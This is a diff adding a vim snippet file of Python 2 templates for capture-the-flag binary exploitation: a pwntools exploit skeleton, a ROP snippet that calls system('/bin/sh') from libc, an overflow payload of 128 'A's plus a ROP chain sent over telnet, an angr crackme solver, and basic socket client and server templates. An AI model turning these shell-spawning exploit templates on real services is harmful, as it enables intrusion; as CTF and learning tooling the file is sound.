@@ -1,0 +1,194 @@
+snippet tpwn "Exploit with pwntools" b
+#!/usr/bin/env python2
+# encoding: utf-8
+
+from pwn import *
+
+LOCAL = "remote" not in sys.argv
+
+elf = ELF("./${1:TODO}")
+context.update(binary=elf)
+#context.terminal = ['/usr/bin/xfce4-terminal', '-e']
+
+if LOCAL:
+    libc = elf.libc
+    r = process(elf.path)
+else:
+    libc = ELF("libc.so")
+    r = remote("${2:localhost}", ${3:1337})
+
+def debug(cmd=''):
+	if "gdb" in sys.argv:
+		pie_base, glibc_base = r.libs()[elf.path], r.libs()[libc.path]
+		gdb.attach(r.proc.pid, cmd + """\nc""")
+	elif "strace" in sys.argv:
+		run_in_new_terminal("strace -ff -p %d && sleep 100" % r.proc.pid)
+	time.sleep(0.5)
+
+log.info('Getting shell...')
+r.interactive()
+r.close()
+endsnippet
+
+snippet trop "ROP with pwntools" b
+libc = ELF(LIBC) if LIBC else elf.libc
+rop = ROP(libc)
+
+libc.address = ${1:0x31337}
+binsh = next(libc.search("/bin/sh"))
+
+rop.system(binsh)
+
+payload = ""
+payload += rop
+
+r.sendline(payload)
+endsnippet
+
+snippet texpl "Exploit structure" b
+#!/usr/bin/python2
+
+import telnetlib
+import struct
+import sys
+
+# Definitions -----------------------------------------------------------------
+
+DEV = True
+
+HOST = "localhost" if DEV else "${2:remote_host}"
+PORT = ${1:1337} if DEV else ${3:31337}
+
+# Exploit ---------------------------------------------------------------------
+
+def read_until(s, stop):
+	res = ''
+
+	while not res.endswith(stop):
+		c = s.recv(1)
+		if c == '':
+			break
+		res += c
+
+	return res
+
+def rop(ropchain):
+	return ''.join(struct.pack("<${4:I}", gadget) for gadget in ropchain)
+
+def exploit(argc, argv):
+	tn = telnetlib.Telnet(HOST, PORT)
+	s = tn.get_socket()
+
+	ropchain = []
+
+	payload = 'A' * 128
+	payload += rop(ropchain)
+
+	s.send(payload + "\n")
+
+	tn.interact()
+
+if __name__ == '__main__':
+	exploit(len(sys.argv), sys.argv)
+endsnippet
+
+snippet tangr "Create a angr solver" b
+#!/usr/bin/env python2
+# encoding: utf-8
+
+import IPython
+import angr
+import simuvex
+import time
+
+main = 0x400761
+win = [0x404FB2]
+melong_str = 0x405094 # "melong"
+avoids = []
+flag_len = 21
+flag_addr = 0x1337000
+
+def patch_0(state):
+    pass
+
+p = angr.Project('angrybird', load_options={'auto_load_libs': False})
+
+state = p.factory.entry_state(addr=0x4007da) # main after fgets
+
+cfg = p.analyses.CFGFast(start=main)
+main_func = cfg.kb.functions[main]
+
+for block in main_func.blocks:
+    first_ins = block.capstone.insns[0].insn
+    if first_ins.mnemonic == 'mov' and first_ins.operands[1].imm == melong_str:
+        avoids.append(block.addr)
+
+flag = state.se.BVS('flag', flag_len * 8)
+
+for c in flag.chop(8): # iterate on each symbolic byte of flag
+    state.add_constraints(c >= 0x20, c <= 0x7f)
+
+state.memory.store(flag_addr, flag)
+state.regs.rbp = flag_addr - 0x50
+
+start_time = time.time()
+angr.path_group.l.setLevel("DEBUG")
+pg = p.factory.path_group(state)#, threads=8)
+ex = pg.explore(find=win, avoid=avoids)
+end_time = time.time()
+
+if len(ex.found):
+       print "[+] Found %d solutions in %d seconds" % (len(ex.found), int(end_time - start_time))
+       s = ex.found[0].state
+       flag = s.se.any_str(s.memory.load(s.regs.rsi, 22))
+       print '[+] Flag:', flag.strip('\x00')
+
+IPython.embed()
+endsnippet
+
+snippet tclient "Create a socket-based client" b
+#!/usr/bin/python2
+
+import socket
+
+HOST = '${1:localhost}'
+PORT = ${2:1337}
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+s.sendall("${3:le fu}")
+
+data = s.recv(1024)
+
+s.close()
+
+print 'Received', repr(data)
+endsnippet
+
+snippet tserver "Create a TCP socket-based server" b
+#!/usr/bin/python2
+
+import socket
+
+HOST = ''
+PORT = ${1:1337}
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((HOST, PORT))
+s.listen(1)
+
+while True:
+	conn, addr = s.accept()
+	print '[+] Connected by', addr
+
+	while 1:
+		${2}data = conn.recv(1024)
+
+		if not data:
+			break
+
+		conn.sendall(data)
+	conn.close()
+endsnippet
+
+# TODO: url auth toussa
